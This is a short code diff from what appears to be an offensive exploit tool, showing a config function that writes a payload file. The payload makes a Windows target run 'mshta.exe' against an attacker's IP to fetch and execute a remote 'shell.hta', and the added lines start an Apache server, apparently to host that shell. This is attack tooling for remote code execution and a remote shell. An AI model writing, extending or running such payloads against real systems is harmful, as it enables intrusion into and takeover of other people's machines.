@@ -21,6 +21,9 @@ def config(ip, port, httpport):
 
     with open('payload.py','w') as f:
         f.write('system_arg = b\'mshta.exe http://' + ip + ':' + httpport +'/shell.hta\' + b\'\\x00\\x00\'')
+    
+    os.system('sudo systemctl start apache2')
+
 
 
 def main():
